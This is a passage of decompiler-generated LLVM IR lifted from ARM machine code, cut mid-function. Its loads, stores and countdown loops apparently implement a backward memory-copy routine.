  %v3_1a650 = load i32, i32* %r0.global-to-local, align 4
  %v4_1a650 = add i32 %v3_1a650, 4
  store i32 %v4_1a650, i32* %r0.global-to-local, align 4
  %v0_1a654 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a654 = add i32 %v0_1a654, -4
  store i32 %v1_1a654, i32* %r2.global-to-local, align 4
  %v3_1a654 = sub i32 3, %v0_1a654
  %v4_1a654 = and i32 %v3_1a654, %v0_1a654
  %v5_1a654 = icmp slt i32 %v4_1a654, 0
  %v6_1a654 = icmp slt i32 %v1_1a654, 0
  %v2_1a658 = xor i1 %v6_1a654, %v5_1a654
  br i1 %v2_1a658, label %dec_label_pc_1a65c.loopexit, label %dec_label_pc_1a644

dec_label_pc_1a65c.loopexit:                      ; preds = %dec_label_pc_1a644
  %v7_1a654 = icmp eq i32 %v0_1a654, 4
  store i1 %v5_1a654, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_1a654, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1a654, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1a65c

dec_label_pc_1a65c:                               ; preds = %dec_label_pc_1a65c.loopexit, %dec_label_pc_1a638
  %v0_1a4ac60 = phi i32 [ %v1_1a654, %dec_label_pc_1a65c.loopexit ], [ %v1_1a63c, %dec_label_pc_1a638 ]
  %v0_1a65c = load i32, i32* %r1.global-to-local, align 4
  %v1_1a65c = add i32 %v0_1a65c, -1
  store i32 %v1_1a65c, i32* %r1.global-to-local, align 4
  br label %bb140

dec_label_pc_1a664:                               ; preds = %entry
  %v1_1a664 = load i32, i32* @r2, align 4
  %v2_1a664 = add i32 %v1_1a664, %v0_1a410
  store i32 %v2_1a664, i32* %r1.global-to-local, align 4
  %v2_1a668 = add i32 %v1_1a664, %v1_1a410
  store i32 %v2_1a668, i32* %r0.global-to-local, align 4
  %v2_1a66c = add i32 %v1_1a664, -4
  store i32 %v2_1a66c, i32* %r2.global-to-local, align 4
  %v4_1a66c = sub i32 3, %v1_1a664
  %v5_1a66c = and i32 %v4_1a66c, %v1_1a664
  %v6_1a66c = icmp slt i32 %v5_1a66c, 0
  store i1 %v6_1a66c, i1* %cpsr_v.global-to-local, align 1
  %v7_1a66c = icmp slt i32 %v2_1a66c, 0
  store i1 %v7_1a66c, i1* %cpsr_n.global-to-local, align 1
  %v8_1a66c = icmp eq i32 %v1_1a664, 4
  store i1 %v8_1a66c, i1* %cpsr_z.global-to-local, align 1
  %v5_1a670 = icmp slt i32 %v1_1a664, 4
  br i1 %v5_1a670, label %bb150, label %dec_label_pc_1a674

dec_label_pc_1a674:                               ; preds = %dec_label_pc_1a664
  %v1_1a674 = urem i32 %v2_1a668, 4
  store i32 %v1_1a674, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1a674 = icmp eq i32 %v1_1a674, 0
  store i1 %v2_1a674, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a674, label %dec_label_pc_1a67c, label %dec_label_pc_1a71c

dec_label_pc_1a67c:                               ; preds = %dec_label_pc_1a674
  %v1_1a67c = urem i32 %v2_1a664, 4
  store i32 %v1_1a67c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1a67c = icmp eq i32 %v1_1a67c, 0
  store i1 %v2_1a67c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a67c, label %dec_label_pc_1a684, label %dec_label_pc_1a748

dec_label_pc_1a684:                               ; preds = %dec_label_pc_1a67c, %dec_label_pc_1a740
  %v0_1a69c36 = phi i32 [ %v2_1a668, %dec_label_pc_1a67c ], [ %v0_1a79019, %dec_label_pc_1a740 ]
  %v0_1a69835 = phi i32 [ %v2_1a664, %dec_label_pc_1a67c ], [ %v0_1a740, %dec_label_pc_1a740 ]
  %v0_1a684 = phi i32 [ %v2_1a66c, %dec_label_pc_1a67c ], [ %v2_1a738, %dec_label_pc_1a740 ]
  %v2_1a684 = add i32 %v0_1a684, -8
  store i32 %v2_1a684, i32* %r2.global-to-local, align 4
  %v4_1a684 = sub i32 7, %v0_1a684
  %v5_1a684 = and i32 %v4_1a684, %v0_1a684
  %v6_1a684 = icmp slt i32 %v5_1a684, 0
  store i1 %v6_1a684, i1* %cpsr_v.global-to-local, align 1
  %v7_1a684 = icmp slt i32 %v2_1a684, 0
  store i1 %v7_1a684, i1* %cpsr_n.global-to-local, align 1
  %v8_1a684 = icmp eq i32 %v0_1a684, 8
  store i1 %v8_1a684, i1* %cpsr_z.global-to-local, align 1
  %v5_1a688 = icmp slt i32 %v0_1a684, 8
  br i1 %v5_1a688, label %dec_label_pc_1a6d4, label %dec_label_pc_1a68c

dec_label_pc_1a68c:                               ; preds = %dec_label_pc_1a684
  %v3_1a68c = load i32, i32* @r4, align 4
  %v5_1a68c = inttoptr i32 %v3_1a68c to i8*
  store i8* %v5_1a68c, i8** %stack_var_-8, align 4
  %v8_1a68c = load i32, i32* @lr, align 4
  %v2_1a690 = add i32 %v0_1a684, -28
  store i32 %v2_1a690, i32* %r2.global-to-local, align 4
  %v4_1a690 = sub i32 27, %v0_1a684
  %v5_1a690 = and i32 %v4_1a690, %v2_1a684
  %v6_1a690 = icmp slt i32 %v5_1a690, 0
  store i1 %v6_1a690, i1* %cpsr_v.global-to-local, align 1
  %v7_1a690 = icmp slt i32 %v2_1a690, 0
  store i1 %v7_1a690, i1* %cpsr_n.global-to-local, align 1
  %v8_1a690 = icmp eq i32 %v2_1a684, 20
  store i1 %v8_1a690, i1* %cpsr_z.global-to-local, align 1
  %v5_1a694 = icmp slt i32 %v2_1a684, 20
  br i1 %v5_1a694, label %dec_label_pc_1a6b0, label %dec_label_pc_1a698

dec_label_pc_1a698:                               ; preds = %dec_label_pc_1a68c, %dec_label_pc_1a698.dec_label_pc_1a698_crit_edge
  %v0_1a69c = phi i32 [ %v1_1a6a4, %dec_label_pc_1a698.dec_label_pc_1a698_crit_edge ], [ %v0_1a69c36, %dec_label_pc_1a68c ]
  %v0_1a698 = phi i32 [ %v0_1a698.pre, %dec_label_pc_1a698.dec_label_pc_1a698_crit_edge ], [ %v0_1a69835, %dec_label_pc_1a68c ]
  %v1_1a698 = add i32 %v0_1a698, -4
  %v2_1a698 = inttoptr i32 %v1_1a698 to i32*
  %v3_1a698 = load i32, i32* %v2_1a698, align 4
  %v4_1a698 = add i32 %v0_1a698, -8
  %v5_1a698 = inttoptr i32 %v4_1a698 to i32*
  %v6_1a698 = load i32, i32* %v5_1a698, align 4
  store i32 %v6_1a698, i32* %r4.global-to-local, align 4
  %v7_1a698 = add i32 %v0_1a698, -12
  %v8_1a698 = inttoptr i32 %v7_1a698 to i32*
  %v9_1a698 = load i32, i32* %v8_1a698, align 4
  store i32 %v9_1a698, i32* %ip.global-to-local, align 4
  %v10_1a698 = add i32 %v0_1a698, -16
  %v11_1a698 = inttoptr i32 %v10_1a698 to i32*
  %v12_1a698 = load i32, i32* %v11_1a698, align 4
  store i32 %v12_1a698, i32* %lr.global-to-local, align 4
  store i32 %v10_1a698, i32* %r1.global-to-local, align 4
  %v1_1a69c = add i32 %v0_1a69c, -16
  %v2_1a69c = inttoptr i32 %v1_1a69c to i32*
  store i32 %v3_1a698, i32* %v2_1a69c, align 4
  %v4_1a69c = add i32 %v0_1a69c, -12
  %v5_1a69c = inttoptr i32 %v4_1a69c to i32*
  %v6_1a69c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1a69c, i32* %v5_1a69c, align 4
  %v7_1a69c = add i32 %v0_1a69c, -8
  %v8_1a69c = inttoptr i32 %v7_1a69c to i32*
  %v9_1a69c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_1a69c, i32* %v8_1a69c, align 4
  %v10_1a69c = add i32 %v0_1a69c, -4
  %v11_1a69c = inttoptr i32 %v10_1a69c to i32*
  %v12_1a69c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1a69c, i32* %v11_1a69c, align 4
  store i32 %v1_1a69c, i32* %r0.global-to-local, align 4
  %v0_1a6a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a6a0 = add i32 %v0_1a6a0, -4
  %v2_1a6a0 = inttoptr i32 %v1_1a6a0 to i32*
  %v3_1a6a0 = load i32, i32* %v2_1a6a0, align 4
  store i32 %v3_1a6a0, i32* @r3, align 4
  %v4_1a6a0 = add i32 %v0_1a6a0, -8
  %v5_1a6a0 = inttoptr i32 %v4_1a6a0 to i32*
  %v6_1a6a0 = load i32, i32* %v5_1a6a0, align 4
  store i32 %v6_1a6a0, i32* %r4.global-to-local, align 4
  %v7_1a6a0 = add i32 %v0_1a6a0, -12
  %v8_1a6a0 = inttoptr i32 %v7_1a6a0 to i32*
  %v9_1a6a0 = load i32, i32* %v8_1a6a0, align 4
  store i32 %v9_1a6a0, i32* @ip, align 4
  %v10_1a6a0 = add i32 %v0_1a6a0, -16
  %v11_1a6a0 = inttoptr i32 %v10_1a6a0 to i32*
  %v12_1a6a0 = load i32, i32* %v11_1a6a0, align 4
  store i32 %v12_1a6a0, i32* %lr.global-to-local, align 4
  store i32 %v10_1a6a0, i32* %r1.global-to-local, align 4
  %v1_1a6a4 = add i32 %v0_1a69c, -32
  %v2_1a6a4 = inttoptr i32 %v1_1a6a4 to i32*
  store i32 %v3_1a6a0, i32* %v2_1a6a4, align 4
  %v4_1a6a4 = add i32 %v0_1a69c, -28
  %v5_1a6a4 = inttoptr i32 %v4_1a6a4 to i32*
  %v6_1a6a4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1a6a4, i32* %v5_1a6a4, align 4
  %v7_1a6a4 = add i32 %v0_1a69c, -24
  %v8_1a6a4 = inttoptr i32 %v7_1a6a4 to i32*
  %v9_1a6a4 = load i32, i32* @ip, align 4
  store i32 %v9_1a6a4, i32* %v8_1a6a4, align 4
  %v10_1a6a4 = add i32 %v0_1a69c, -20
  %v11_1a6a4 = inttoptr i32 %v10_1a6a4 to i32*
  %v12_1a6a4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1a6a4, i32* %v11_1a6a4, align 4
  store i32 %v1_1a6a4, i32* %r0.global-to-local, align 4
  %v0_1a6a8 = load i32, i32* %r2.global-to-local, align 4
  %v2_1a6a8 = add i32 %v0_1a6a8, -32
  store i32 %v2_1a6a8, i32* %r2.global-to-local, align 4
  %v6_1a6ac = icmp slt i32 %v0_1a6a8, 32
  br i1 %v6_1a6ac, label %dec_label_pc_1a6b0.loopexit, label %dec_label_pc_1a698.dec_label_pc_1a698_crit_edge

dec_label_pc_1a698.dec_label_pc_1a698_crit_edge:  ; preds = %dec_label_pc_1a698
  %v0_1a698.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a698

dec_label_pc_1a6b0.loopexit:                      ; preds = %dec_label_pc_1a698
  %v4_1a6a8 = sub i32 31, %v0_1a6a8
  %v5_1a6a8 = and i32 %v4_1a6a8, %v0_1a6a8
  %v6_1a6a8 = icmp slt i32 %v5_1a6a8, 0
  %v7_1a6a8 = icmp slt i32 %v2_1a6a8, 0
  store i1 %v6_1a6a8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1a6a8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1a6b0

dec_label_pc_1a6b0:                               ; preds = %dec_label_pc_1a6b0.loopexit, %dec_label_pc_1a68c
  %v6_1a6b8 = phi i32 [ %v1_1a6a4, %dec_label_pc_1a6b0.loopexit ], [ %v0_1a69c36, %dec_label_pc_1a68c ]
  %v0_1a6c0.pr = phi i32 [ %v2_1a6a8, %dec_label_pc_1a6b0.loopexit ], [ %v2_1a690, %dec_label_pc_1a68c ]
  %v4_1a6b0 = add i32 %v0_1a6c0.pr, 16
  %v6_1a6b0 = sub i32 0, %v0_1a6c0.pr
  %v7_1a6b0 = and i32 %v4_1a6b0, %v6_1a6b0
  %v8_1a6b0 = icmp slt i32 %v7_1a6b0, 0
  store i1 %v8_1a6b0, i1* %cpsr_v.global-to-local, align 1
  %v9_1a6b0 = icmp slt i32 %v4_1a6b0, 0
  store i1 %v9_1a6b0, i1* %cpsr_n.global-to-local, align 1
  %v10_1a6b0 = icmp eq i32 %v4_1a6b0, 0
  store i1 %v10_1a6b0, i1* %cpsr_z.global-to-local, align 1
  %v5_1a6b4 = icmp slt i32 %v0_1a6c0.pr, -16
  br i1 %v5_1a6b4, label %.thread1, label %bb147

bb147:                                            ; preds = %dec_label_pc_1a6b0
  %v6_1a6b4 = load i32, i32* %r1.global-to-local, align 4
  %v7_1a6b4 = add i32 %v6_1a6b4, -4
  %v8_1a6b4 = inttoptr i32 %v7_1a6b4 to i32*
  %v9_1a6b4 = load i32, i32* %v8_1a6b4, align 4
  store i32 %v9_1a6b4, i32* @r3, align 4
  %v10_1a6b4 = add i32 %v6_1a6b4, -8
  %v11_1a6b4 = inttoptr i32 %v10_1a6b4 to i32*
  %v12_1a6b4 = load i32, i32* %v11_1a6b4, align 4
  store i32 %v12_1a6b4, i32* %r4.global-to-local, align 4
  %v13_1a6b4 = add i32 %v6_1a6b4, -12
  %v14_1a6b4 = inttoptr i32 %v13_1a6b4 to i32*
  %v15_1a6b4 = load i32, i32* %v14_1a6b4, align 4
  store i32 %v15_1a6b4, i32* @ip, align 4
  %v16_1a6b4 = add i32 %v6_1a6b4, -16
  %v17_1a6b4 = inttoptr i32 %v16_1a6b4 to i32*
  %v18_1a6b4 = load i32, i32* %v17_1a6b4, align 4
  store i32 %v18_1a6b4, i32* %lr.global-to-local, align 4
  store i32 %v16_1a6b4, i32* %r1.global-to-local, align 4
  %v7_1a6b8 = add i32 %v6_1a6b8, -16
  %v8_1a6b8 = inttoptr i32 %v7_1a6b8 to i32*
  store i32 %v9_1a6b4, i32* %v8_1a6b8, align 4
  %v10_1a6b8 = add i32 %v6_1a6b8, -12
  %v11_1a6b8 = inttoptr i32 %v10_1a6b8 to i32*
  %v12_1a6b8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_1a6b8, i32* %v11_1a6b8, align 4
  %v13_1a6b8 = add i32 %v6_1a6b8, -8
  %v14_1a6b8 = inttoptr i32 %v13_1a6b8 to i32*
  %v15_1a6b8 = load i32, i32* @ip, align 4
  store i32 %v15_1a6b8, i32* %v14_1a6b8, align 4
  %v16_1a6b8 = add i32 %v6_1a6b8, -4
  %v17_1a6b8 = inttoptr i32 %v16_1a6b8 to i32*
  %v18_1a6b8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_1a6b8, i32* %v17_1a6b8, align 4
  store i32 %v7_1a6b8, i32* %r0.global-to-local, align 4
  %v6_1a6bc = load i32, i32* %r2.global-to-local, align 4
  %v7_1a6bc = add i32 %v6_1a6bc, -16
  store i32 %v7_1a6bc, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1a6b0, %bb147
  %v6_1a6c8 = phi i32 [ %v7_1a6b8, %bb147 ], [ %v6_1a6b8, %dec_label_pc_1a6b0 ]
  %v0_1a6c0 = phi i32 [ %v7_1a6bc, %bb147 ], [ %v0_1a6c0.pr, %dec_label_pc_1a6b0 ]
  %v4_1a6c0 = add i32 %v0_1a6c0, 20
  store i32 %v4_1a6c0, i32* %r2.global-to-local, align 4
  %v6_1a6c0 = sub i32 0, %v0_1a6c0
  %v7_1a6c0 = and i32 %v4_1a6c0, %v6_1a6c0
  %v8_1a6c0 = icmp slt i32 %v7_1a6c0, 0
  store i1 %v8_1a6c0, i1* %cpsr_v.global-to-local, align 1
  %v9_1a6c0 = icmp slt i32 %v4_1a6c0, 0
  store i1 %v9_1a6c0, i1* %cpsr_n.global-to-local, align 1
  %v10_1a6c0 = icmp eq i32 %v4_1a6c0, 0
  store i1 %v10_1a6c0, i1* %cpsr_z.global-to-local, align 1
  %v5_1a6c4 = icmp slt i32 %v0_1a6c0, -20
  br i1 %v5_1a6c4, label %.thread3, label %bb148

bb148:                                            ; preds = %.thread1
  %v6_1a6c4 = load i32, i32* %r1.global-to-local, align 4
  %v7_1a6c4 = add i32 %v6_1a6c4, -4
  %v8_1a6c4 = inttoptr i32 %v7_1a6c4 to i32*
  %v9_1a6c4 = load i32, i32* %v8_1a6c4, align 4
  store i32 %v9_1a6c4, i32* @r3, align 4
  %v10_1a6c4 = add i32 %v6_1a6c4, -8
  %v11_1a6c4 = inttoptr i32 %v10_1a6c4 to i32*
  %v12_1a6c4 = load i32, i32* %v11_1a6c4, align 4
  store i32 %v12_1a6c4, i32* @ip, align 4
  %v13_1a6c4 = add i32 %v6_1a6c4, -12
  %v14_1a6c4 = inttoptr i32 %v13_1a6c4 to i32*
  %v15_1a6c4 = load i32, i32* %v14_1a6c4, align 4
  store i32 %v15_1a6c4, i32* %lr.global-to-local, align 4
  store i32 %v13_1a6c4, i32* %r1.global-to-local, align 4
  %v7_1a6c8 = add i32 %v6_1a6c8, -12
  %v8_1a6c8 = inttoptr i32 %v7_1a6c8 to i32*
  store i32 %v9_1a6c4, i32* %v8_1a6c8, align 4
  %v10_1a6c8 = add i32 %v6_1a6c8, -8
  %v11_1a6c8 = inttoptr i32 %v10_1a6c8 to i32*
  %v12_1a6c8 = load i32, i32* @ip, align 4
  store i32 %v12_1a6c8, i32* %v11_1a6c8, align 4
  %v13_1a6c8 = add i32 %v6_1a6c8, -4
  %v14_1a6c8 = inttoptr i32 %v13_1a6c8 to i32*
  %v15_1a6c8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_1a6c8, i32* %v14_1a6c8, align 4
  store i32 %v7_1a6c8, i32* %r0.global-to-local, align 4
  %v6_1a6cc = load i32, i32* %r2.global-to-local, align 4
  %v7_1a6cc = add i32 %v6_1a6cc, -12
  store i32 %v7_1a6cc, i32* %r2.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %bb148
  %v6_1a6ec44 = phi i32 [ %v6_1a6c8, %.thread1 ], [ %v7_1a6c8, %bb148 ]
  %v0_1a6d442 = phi i32 [ %v4_1a6c0, %.thread1 ], [ %v7_1a6cc, %bb148 ]
  %v2_1a6d0 = load i8*, i8** %stack_var_-8, align 4
  %v3_1a6d0 = ptrtoint i8* %v2_1a6d0 to i32
  store i32 %v3_1a6d0, i32* @r4, align 4
  store i32 %v8_1a68c, i32* @lr, align 4
  br label %dec_label_pc_1a6d4

dec_label_pc_1a6d4:                               ; preds = %dec_label_pc_1a684, %.thread3
  %v7_1a6e4 = phi i32 [ %v0_1a69c36, %dec_label_pc_1a684 ], [ %v6_1a6ec44, %.thread3 ]
  %v0_1a6d4 = phi i32 [ %v2_1a684, %dec_label_pc_1a684 ], [ %v0_1a6d442, %.thread3 ]
  %v2_1a6d4 = add i32 %v0_1a6d4, 8
  store i32 %v2_1a6d4, i32* %r2.global-to-local, align 4
  %v4_1a6d4 = sub i32 0, %v0_1a6d4
  %v5_1a6d4 = and i32 %v2_1a6d4, %v4_1a6d4
  %v6_1a6d4 = icmp slt i32 %v5_1a6d4, 0
  store i1 %v6_1a6d4, i1* %cpsr_v.global-to-local, align 1
  %v7_1a6d4 = icmp slt i32 %v2_1a6d4, 0
  store i1 %v7_1a6d4, i1* %cpsr_n.global-to-local, align 1
  %v8_1a6d4 = icmp eq i32 %v2_1a6d4, 0
  store i1 %v8_1a6d4, i1* %cpsr_z.global-to-local, align 1
  %v5_1a6d8 = icmp slt i32 %v0_1a6d4, -8
  br i1 %v5_1a6d8, label %bb150, label %dec_label_pc_1a6dc

dec_label_pc_1a6dc:                               ; preds = %dec_label_pc_1a6d4
  %v6_1a6dc = add i32 %v0_1a6d4, 4
  store i32 %v6_1a6dc, i32* %r2.global-to-local, align 4
  %v8_1a6dc = sub i32 -5, %v0_1a6d4
  %v9_1a6dc = and i32 %v8_1a6dc, %v2_1a6d4
  %v10_1a6dc = icmp slt i32 %v9_1a6dc, 0
  store i1 %v10_1a6dc, i1* %cpsr_v.global-to-local, align 1
  %v11_1a6dc = icmp slt i32 %v6_1a6dc, 0
  store i1 %v11_1a6dc, i1* %cpsr_n.global-to-local, align 1
  %v12_1a6dc = icmp eq i32 %v2_1a6d4, 4
  store i1 %v12_1a6dc, i1* %cpsr_z.global-to-local, align 1
  %v5_1a6e0 = icmp slt i32 %v2_1a6d4, 4
  %v6_1a6e0 = load i32, i32* %r1.global-to-local, align 4
  %v7_1a6e0 = add i32 %v6_1a6e0, -4
  %v8_1a6e0 = inttoptr i32 %v7_1a6e0 to i32*
  %v9_1a6e0 = load i32, i32* %v8_1a6e0, align 4
  store i32 %v9_1a6e0, i32* @r3, align 4
  br i1 %v5_1a6e0, label %.thread7, label %bb149

.thread7:                                         ; preds = %dec_label_pc_1a6dc
  store i32 %v7_1a6e0, i32* %r1.global-to-local, align 4
  %v8_1a6e4 = add i32 %v7_1a6e4, -4
  %v9_1a6e4 = inttoptr i32 %v8_1a6e4 to i32*
  store i32 %v9_1a6e0, i32* %v9_1a6e4, align 4
  %v10_1a6e4 = load i32, i32* %r0.global-to-local, align 4
  %v11_1a6e4 = add i32 %v10_1a6e4, -4
  store i32 %v11_1a6e4, i32* %r0.global-to-local, align 4
  %v0_1a6f4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_1a6dc
  %v10_1a6e8 = add i32 %v6_1a6e0, -8
  %v11_1a6e8 = inttoptr i32 %v10_1a6e8 to i32*
  %v12_1a6e8 = load i32, i32* %v11_1a6e8, align 4
  store i32 %v12_1a6e8, i32* @ip, align 4
  store i32 %v10_1a6e8, i32* %r1.global-to-local, align 4
  %v7_1a6ec = add i32 %v7_1a6e4, -8
  %v8_1a6ec = inttoptr i32 %v7_1a6ec to i32*
  store i32 %v9_1a6e0, i32* %v8_1a6ec, align 4
  %v10_1a6ec = add i32 %v7_1a6e4, -4
  %v11_1a6ec = inttoptr i32 %v10_1a6ec to i32*
  %v12_1a6ec = load i32, i32* @ip, align 4
  store i32 %v12_1a6ec, i32* %v11_1a6ec, align 4
  store i32 %v7_1a6ec, i32* %r0.global-to-local, align 4
  %v6_1a6f0 = load i32, i32* %r2.global-to-local, align 4
  %v7_1a6f0 = add i32 %v6_1a6f0, -4
  store i32 %v7_1a6f0, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread7, %dec_label_pc_1a6d4, %.thread13, %dec_label_pc_1a664, %dec_label_pc_1a898, %dec_label_pc_1a82c, %dec_label_pc_1a7c0, %bb149
  %v2_1a6f8 = phi i32 [ %v11_1a6e4, %.thread7 ], [ %v7_1a6e4, %dec_label_pc_1a6d4 ], [ %v0_1a79019, %.thread13 ], [ %v2_1a668, %dec_label_pc_1a664 ], [ %v2_1a70452, %dec_label_pc_1a898 ], [ %v2_1a70451, %dec_label_pc_1a82c ], [ %v2_1a70450, %dec_label_pc_1a7c0 ], [ %v7_1a6ec, %bb149 ]
  %v0_1a6f4 = phi i32 [ %v0_1a6f4.pre, %.thread7 ], [ %v2_1a6d4, %dec_label_pc_1a6d4 ], [ %v2_1a738, %.thread13 ], [ %v2_1a66c, %dec_label_pc_1a664 ], [ %v0_1a6f448, %dec_label_pc_1a898 ], [ %v0_1a6f447, %dec_label_pc_1a82c ], [ %v0_1a6f446, %dec_label_pc_1a7c0 ], [ %v7_1a6f0, %bb149 ]
  %v1_1a6f4 = add i32 %v0_1a6f4, 4
  store i32 %v1_1a6f4, i32* @r2, align 4
  %v3_1a6f4 = sub i32 0, %v0_1a6f4
  %v4_1a6f4 = and i32 %v1_1a6f4, %v3_1a6f4
  %v5_1a6f4 = icmp slt i32 %v4_1a6f4, 0
  store i1 %v5_1a6f4, i1* %cpsr_v.global-to-local, align 1
  %v6_1a6f4 = icmp slt i32 %v1_1a6f4, 0
  store i1 %v6_1a6f4, i1* %cpsr_n.global-to-local, align 1
  %v7_1a6f4 = icmp eq i32 %v1_1a6f4, 0
  store i1 %v7_1a6f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a6f4, label %.thread129, label %bb151

bb151:                                            ; preds = %bb150
  %v1_1a6fc = add i32 %v0_1a6f4, 2
  %v3_1a6fc = sub i32 -3, %v0_1a6f4
  %v4_1a6fc = and i32 %v3_1a6fc, %v1_1a6f4
  %v5_1a6fc = icmp slt i32 %v4_1a6fc, 0
  store i1 %v5_1a6fc, i1* %cpsr_v.global-to-local, align 1
  %v6_1a6fc = icmp slt i32 %v1_1a6fc, 0
  store i1 %v6_1a6fc, i1* %cpsr_n.global-to-local, align 1
  %v7_1a6fc = icmp eq i32 %v1_1a6f4, 2
  store i1 %v7_1a6fc, i1* %cpsr_z.global-to-local, align 1
  %v0_1a700 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a700 = add i32 %v0_1a700, -1
  %v2_1a700 = inttoptr i32 %v1_1a700 to i8*
  %v3_1a700 = load i8, i8* %v2_1a700, align 1
  %v4_1a700 = zext i8 %v3_1a700 to i32
  store i32 %v4_1a700, i32* @r3, align 4
  store i32 %v1_1a700, i32* %r1.global-to-local, align 4
  %v3_1a704 = add i32 %v2_1a6f8, -1
  %v4_1a704 = inttoptr i32 %v3_1a704 to i8*
  store i8 %v3_1a700, i8* %v4_1a704, align 1
  %v5_1a704 = load i32, i32* %r0.global-to-local, align 4
  %v6_1a704 = add i32 %v5_1a704, -1
  store i32 %v6_1a704, i32* %r0.global-to-local, align 4
  %v0_1a708 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1a708 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1a708 = xor i1 %v0_1a708, %v1_1a708
  br i1 %v2_1a708, label %.thread128, label %bb152

bb152:                                            ; preds = %bb151
  %v3_1a708 = load i32, i32* %r1.global-to-local, align 4
  %v4_1a708 = add i32 %v3_1a708, -1
  %v5_1a708 = inttoptr i32 %v4_1a708 to i8*
  %v6_1a708 = load i8, i8* %v5_1a708, align 1
  %v7_1a708 = zext i8 %v6_1a708 to i32
  store i32 %v7_1a708, i32* @r3, align 4
  store i32 %v4_1a708, i32* %r1.global-to-local, align 4
  %v6_1a70c = add i32 %v5_1a704, -2
  %v7_1a70c = inttoptr i32 %v6_1a70c to i8*
  store i8 %v6_1a708, i8* %v7_1a70c, align 1
  %v8_1a70c = load i32, i32* %r0.global-to-local, align 4
  %v9_1a70c = add i32 %v8_1a70c, -1
  store i32 %v9_1a70c, i32* %r0.global-to-local, align 4
  %v1_1a710.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1a710.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread128

.thread128:                                       ; preds = %bb151, %bb152
  %v7_1a714 = phi i32 [ %v9_1a70c, %bb152 ], [ %v6_1a704, %bb151 ]
  %v2_1a714 = phi i1 [ %v2_1a710.pre, %bb152 ], [ %v1_1a708, %bb151 ]
  %v1_1a714 = phi i1 [ %v1_1a710.pre, %bb152 ], [ %v0_1a708, %bb151 ]
  %v0_1a710 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_1a710 = xor i1 %v2_1a714, %v1_1a714
  %v4_1a710 = or i1 %v0_1a710, %v3_1a710
  br i1 %v4_1a710, label %.thread129, label %bb153

bb153:                                            ; preds = %.thread128
  %v5_1a710 = load i32, i32* %r1.global-to-local, align 4
  %v6_1a710 = add i32 %v5_1a710, -1
  %v7_1a710 = inttoptr i32 %v6_1a710 to i8*
  %v8_1a710 = load i8, i8* %v7_1a710, align 1
  %v9_1a710 = zext i8 %v8_1a710 to i32
  store i32 %v9_1a710, i32* @r3, align 4
  store i32 %v6_1a710, i32* %r1.global-to-local, align 4
  %v8_1a714 = add i32 %v7_1a714, -1
  %v9_1a714 = inttoptr i32 %v8_1a714 to i8*
  store i8 %v8_1a710, i8* %v9_1a714, align 1
  %v10_1a714 = load i32, i32* %r0.global-to-local, align 4
  %v11_1a714 = add i32 %v10_1a714, -1
  store i32 %v11_1a714, i32* %r0.global-to-local, align 4
  br label %.thread129

dec_label_pc_1a71c:                               ; preds = %dec_label_pc_1a674
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_1a71c = icmp eq i32 %v1_1a674, 1
  store i1 %v8_1a71c, i1* %cpsr_n.global-to-local, align 1
  %v9_1a71c = icmp eq i32 %v1_1a674, 2
  store i1 %v9_1a71c, i1* %cpsr_z.global-to-local, align 1
  %v1_1a720 = add i32 %v2_1a664, -1
  %v2_1a720 = inttoptr i32 %v1_1a720 to i8*
  %v3_1a720 = load i8, i8* %v2_1a720, align 1
  %v4_1a720 = zext i8 %v3_1a720 to i32
  store i32 %v4_1a720, i32* @r3, align 4
  store i32 %v1_1a720, i32* %r1.global-to-local, align 4
  %v3_1a724 = add i32 %v2_1a668, -1
  %v4_1a724 = inttoptr i32 %v3_1a724 to i8*
  store i8 %v3_1a720, i8* %v4_1a724, align 1
  %v5_1a724 = load i32, i32* %r0.global-to-local, align 4
  %v6_1a724 = add i32 %v5_1a724, -1
  store i32 %v6_1a724, i32* %r0.global-to-local, align 4
  br i1 %v8_1a71c, label %.thread13, label %bb154

bb154:                                            ; preds = %dec_label_pc_1a71c
  %v6_1a728 = load i32, i32* %r1.global-to-local, align 4
  %v7_1a728 = add i32 %v6_1a728, -1
  %v8_1a728 = inttoptr i32 %v7_1a728 to i8*
  %v9_1a728 = load i8, i8* %v8_1a728, align 1
  %v10_1a728 = zext i8 %v9_1a728 to i32
  store i32 %v10_1a728, i32* @r3, align 4
  store i32 %v7_1a728, i32* %r1.global-to-local, align 4
  %v9_1a72c = add i32 %v5_1a724, -2
  %v10_1a72c = inttoptr i32 %v9_1a72c to i8*
  store i8 %v9_1a728, i8* %v10_1a72c, align 1
  %v11_1a72c = load i32, i32* %r0.global-to-local, align 4
